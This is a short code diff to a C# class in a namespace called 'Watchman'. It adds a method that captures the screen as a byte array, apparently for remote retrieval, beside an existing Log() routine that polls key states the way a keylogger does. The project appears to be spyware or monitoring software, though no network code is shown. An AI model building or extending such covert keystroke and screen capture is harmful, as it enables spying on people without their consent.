@@ -142,6 +142,12 @@ namespace Watchman
             }
         }
 
+        public static byte[] RemoteTakeScreen()
+        {
+            ImageConverter converter = new ImageConverter();
+            return (byte[])converter.ConvertTo(BitMapCreater(), typeof(byte[]));
+        }
+
         public void Log()
         {
             _shift = GetAsyncKeyState((int)Keys.ShiftKey);
